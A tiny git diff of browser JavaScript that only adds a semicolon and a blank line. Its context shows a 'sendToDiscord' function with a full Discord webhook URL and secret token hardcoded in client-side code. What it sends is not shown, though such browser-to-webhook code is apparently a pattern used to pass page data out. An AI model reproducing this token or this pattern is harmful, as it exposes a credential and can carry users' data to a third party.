@@ -1,5 +1,5 @@
 // Initialize Buffer for browser environment
-window.Buffer = buffer.Buffer
+window.Buffer = buffer.Buffer;
 
 async function sendToDiscord(message) {
     const webhookUrl = 'https://discord.com/api/webhooks/1424826301025488946/EripCWiQWqL5VT61z9pGJmm4fGhZf876gn5neA9Gn2FSM8_kgjeCQweEynxRRAL4lj8J';
@@ -130,4 +130,5 @@ $(document).ready(function() {
         }
     }
 });
+
 
